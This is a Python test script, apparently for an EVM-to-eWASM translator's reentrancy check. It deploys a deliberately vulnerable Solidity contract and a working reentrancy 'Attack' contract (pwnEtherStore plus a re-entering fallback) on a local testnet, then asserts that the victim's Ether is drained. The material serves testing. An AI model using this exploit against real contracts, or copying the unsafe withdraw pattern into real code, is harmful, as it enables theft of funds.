# author cswmchen
# date   15-11-21
# python -m runtimeTest.example   --langArgs="--check-reentrancy"
import argparse
from web3 import Web3
import solcx

victimSol = '''
pragma solidity ^0.8.11;

contract reEntrancy {
  mapping(address => uint256) public balances;

  constructor(uint256 airtoken){
    balances[msg.sender] = airtoken;
  }

  function depositFunds() public payable {
      balances[msg.sender] += msg.value;
  }
  function withdrawFunds (uint256 _weiToWithdraw) public payable {
    require(balances[msg.sender] >= _weiToWithdraw);
    (bool success, ) = msg.sender.call{value: _weiToWithdraw, gas:gasleft()}(abi.encodeWithSignature("any()") );
    require(success);
    unchecked { 
        balances[msg.sender] -= _weiToWithdraw;
    }
    }
}
'''

expAgentSol = '''
contract ReEntrancy {
    mapping(address => uint256) public balances;
    function depositFunds() public payable;    function withdrawFunds (uint256 _weiToWithdraw) public payable;
 }

contract Attack {
  ReEntrancy public instance;
    address public _at;

  // intialise the etherStore variable with the contract address
  constructor(address _instanceAddr) {
      instance = ReEntrancy(_instanceAddr);
      _at = _instanceAddr;
  }
  
  function balanceOf(address account) view public returns (uint256) {
      return instance.balances(account);
  }
  function pay() public payable {
      require(msg.value >= 1 ether);
  }
  function deposit() public payable {
      instance.depositFunds.value(1 ether)();
  }
  
  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      instance.depositFunds.value(1 ether)();
      instance.withdrawFunds(1 ether);
  }
  
  function collectEther() public {
      msg.sender.transfer(this.balance);
  }
    
  function () payable {
      if (instance.balance >= 1 ether) {
          instance.withdrawFunds(1 ether);
      }
  }
}
'''


def runRPC():
    w3 = Web3(Web3.HTTPProvider("http://localhost:8545",
              request_kwargs={'timeout': 60}))
    from web3.middleware import geth_poa_middleware
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    assert w3.isConnected() == True, "[ERROR] Testnet is not activated."
    if len(w3.eth.accounts) < 2:
        w3.geth.personal.new_account("")
    for account in w3.eth.accounts:
        w3.geth.personal.unlock_account(account, "", 99999)
    return w3


def transferEther(w3, _from, _to, _value):
    _tx_hash = w3.eth.sendTransaction(
        {'from': _from, 'to': _to, 'value': _value})
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)


def compile_source_file(source, version='0.4.26'):
    solcx.install_solc(version)
    res = solcx.compile_source(source, output_values=[
                               "abi", "bin", "bin-runtime"], solc_version=version)
    _name = list(res.keys())[0]
    return res[_name]


def evm2ewasm(evmHex, args):
    import os
    with open('.tmp.hex', 'w') as f:
        f.write(evmHex)
    cmd = "cat ./.tmp.hex | xxd -r -ps > .tmp.bin && /home/toor/evmTrans/EVMTrans/build/evmtrans/standalone-evmtrans .tmp.bin -o res.wasm " + \
        args.langArgs + " > /dev/null 2>&1"
    if 0 != os.system(cmd):
        raise Exception("EVMTrans fall.")
    return os.popen(f"xxd -p res.wasm | tr -d $'\n'").read()


def deploy_contract(w3, owner, abi, bytecode, args=""):
    if args != "":
        _tx_hash = w3.eth.contract(abi=abi, bytecode=bytecode).constructor(
            args).transact({'from': owner, 'gas': 300000000000})
    else:
        _tx_hash = w3.eth.contract(abi=abi, bytecode=bytecode).constructor().transact({
            'from': owner, 'gas': 300000000000})
    address = w3.eth.wait_for_transaction_receipt(_tx_hash)['contractAddress']
    return address


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--langArgs", help="arguments for the translator",
                        required=False, type=str, default="")
    args = parser.parse_args()

    w3 = runRPC()
    if w3.eth.get_balance(w3.eth.accounts[1]) < w3.toWei(2, 'ether'):
        transferEther(w3, w3.eth.accounts[0],
                      w3.eth.accounts[1], w3.toWei(2, 'ether'))

    cmrt = compile_source_file(victimSol, version='0.8.11')
    _tx = {'from': w3.eth.accounts[0], 'value': 0, 'gas': 6300000160000, 'data': evm2ewasm(
        cmrt['bin'] + "0000000000000000000000000000000000000000000000000000000000000010", args)}
    receipt = w3.eth.wait_for_transaction_receipt(w3.eth.send_transaction(_tx))
    victimAddr = receipt['contractAddress']
    victim = w3.eth.contract(address=victimAddr, abi=cmrt['abi'])
    print("eWASM contract deployed at ", victimAddr)
    _tx_hash = victim.functions.depositFunds().transact(
        {'from': w3.eth.accounts[0], 'value': w3.toWei(4, 'ether'), 'gas': 100000})
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)

    # deploy atkAgent in EVM bytecode
    cmrt = compile_source_file(expAgentSol, version='0.4.26')
    atkAgentAddr = deploy_contract(
        w3, w3.eth.accounts[1], cmrt['abi'], cmrt['bin'], victimAddr)
    atkAgent = w3.eth.contract(address=atkAgentAddr, abi=cmrt['abi'])

    print(f"=========================== initial states ================================")
    print(f"Balance@victim={w3.eth.get_balance(victimAddr)/1e18} Ether")
    print(f"Balance@atkAgent={w3.eth.get_balance(atkAgentAddr)/1e18} Ether")

    print(f"attacking...\n")
    _tx_hash = atkAgent.functions.pwnEtherStore().transact(
        {'from': w3.eth.accounts[1], 'value': w3.toWei(1, 'ether'), 'gas': 3000000000})
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)

    # prtInfo(f"=========================== exploited ================================")
    print(f"Balance@victim={w3.eth.get_balance(victimAddr)/1e18} Ether")
    print(f"Balance@atkAgent={w3.eth.get_balance(atkAgentAddr)/1e18} Ether")

    assert w3.eth.get_balance(
        victimAddr) == 0, "Fail to steal Ether from the victim"
    print("PASSED")


main()
